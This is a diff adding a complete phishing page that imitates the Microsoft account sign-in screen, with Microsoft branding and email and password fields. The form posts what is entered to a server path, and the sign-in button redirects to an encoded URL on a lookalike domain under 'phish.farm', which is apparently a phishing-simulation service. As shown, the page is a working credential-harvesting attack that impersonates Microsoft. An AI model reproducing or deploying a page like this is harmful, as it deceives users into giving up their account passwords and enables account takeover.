@@ -1,0 +1,55 @@
+<script class="jsbin" src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+<link href="https://auth.gfx.ms/16.000.26252.00/favicon.ico?v=2" rel="shortcut icon" />
+<title></title>
+<style type="text/css">* {box-sizing:border-box;}
+body {font-family:"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";font-size:15px;color:#000;}
+  ::-webkit-input-placeholder {color:#666;}
+  :-moz-placeholder {color:#666;}
+  ::-moz-placeholder {color:#666;}
+  :-ms-input-placeholder {color:#666;}
+  h1 {font-size:34px;color:#000;font-weight:200;}
+  a, a:hover, a:focus {color:#0072c6;text-decoration:none;}
+  form {width:100%;max-width:356px;margin:0 auto;display:block;}
+  .check-wrap {position:relative;width:100%;text-align:left;padding:4px 0 4px 30px;margin-bottom:18px;}
+  input[type=text], input[type=password] {border:2px solid rgba(0,0,0,.4);background-color:rgba(255,255,255,0.4);color:#000;font-size:15px;padding:6px 8px;margin-bottom:12px;}
+  input[type=text]:focus, input[type=password]:focus {border-color:#0078d7;background-color:#fff;}
+  input[type=checkbox] {width:20px;height:20px;position:absolute;top:0;left:0;}
+  input[type=text], input[type=password], input[type=submit] {width:100%;}
+  #logon {background-color:#0078d7;border:0;color:#fff;padding:8px 12px;text-align:center;width:100%;font-size:15px;}
+  #logon:hover {background-color:#004e8c;cursor:pointer;}
+</style>
+<center><img alt="Microsoft logo." height="25" src="https://i.pinimg.com/originals/fa/d0/6e/fad06edbb3c9a3655233c6ab64c47c81.png" style="width: 100px; height: 25px; margin: 2% auto 0 auto;" width="100" />
+<h1>Sign in</h1>
+
+<p>Use your Microsoft account.<br />
+<a href="#">What's this?</a></p>
+
+<form action="/pages/c3955b1c48a" id="loginform" method="post"><input id="uname" name="uname" placeholder="Email or phone" required="" type="text" /> <input id="password" name="password" placeholder="Password" required="" type="password" />
+<div class="check-wrap"><input id="keep" name="keep" type="checkbox" /> <label for="keep">Keep me signed in</label></div>
+<input id="logon" name="logon" type="submit" value="Sign in" onClick="signIn()" />&nbsp;</form>
+<script>
+jQuery(function($) {
+  
+  $('#loginform').submit(function() {
+    var txt = $('#password');
+    txt.val("*******");
+  });
+   
+  function display(msg) {
+    $('<p/>').html(msg).appendTo(document.body);
+  }
+});
+</script>
+
+<p>No account? <a href="#">Create one!</a></p>
+
+<p style="margin-top:40px;font-size:13px;"><a href="#">Forgot my password</a><br />
+<br />
+<a href="#">Sign in with a single-use code</a></p>
+</center>
+
+<script>
+      function signIn() {
+        window.location.href="https://login.gogie.com.000000000000.phish.farm/XTXpsQ1VUWkJTamhoUzFKSmVERXJUM3A0VEcxaWJ6UnpSV0V3SzB0SFJtcGxOR0ZCUVZoRVR6QmlNMHRuSzNwa016VXlUMWRuT1VVM2RVTlhabWc1TkRGbGVFbG1ObmhRVUc5bVMxcHBLeTh2Ylc5dmNVUkZlV0pUTUdkTWQycDROR0Z1YVZkc2JrOVlZalIwTkZaSlkzWTFhVFprZVN0cGNYRlZOSEkxTm1ScFNYWnhZMnBYVVZCT1oyMUdNazgzUzFWSmVFNUtUMDVPZW14M2FGVXhWVWMyWjBOYVpWTmFLMVpLYW1KRlpETm9NMlJFYlRGSFRHUkVNbGRpYlhjdkxTMVZRblJQUXpsNFoyeEtTVkJvY1RWTlRWbzFjMFYzUFQwPS0tNDBlMjk1NTBjZjNhNWFhZmU1ZmUyMjdlMmRmOTcwYTljMjM4NzEyOQ==?cid=1573950046";
+      }
+</script>
